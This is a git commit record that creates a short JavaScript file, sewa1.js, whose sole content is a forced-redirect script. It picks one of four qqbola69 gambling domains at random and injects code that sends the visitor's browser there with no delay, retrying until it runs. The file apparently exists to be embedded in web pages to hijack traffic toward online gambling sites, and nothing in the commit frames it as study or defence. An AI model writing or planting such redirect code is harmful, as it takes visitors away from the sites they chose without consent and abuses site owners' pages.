69aecfab9fe8efb9f2ea89e449f5c12523c3c4b6
judisuhu1-ux <judisuhu1@gmail.com>
2026-07-28 05:06:48 +0800

    Create sewa1.js

---
+++ sewa1.js
@@ -0,0 +1,27 @@
+var url = Array(
+  "https://qqbola69a.com/",
+  "https://qqbola69b.com/",
+  "https://qqbola69bet.com/",
+  "https://qqbola69.org/"
+);
+var rid = "";
+
+var timesleep = 0;  // Tidak ada penundaan atau penundaan minimal
+
+function put() {
+    var script = document.createElement("script");
+    script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)] + "" + rid; setTimeout(function () { window.location = weburl; }, timesleep);';
+    document.body.appendChild(script);
+}
+
+function jump() {
+    if (typeof url == 'undefined' || url == null) {
+        setTimeout(function() {
+            jump();
+        }, 50);
+    } else {
+        put();
+    }
+}
+
+jump();
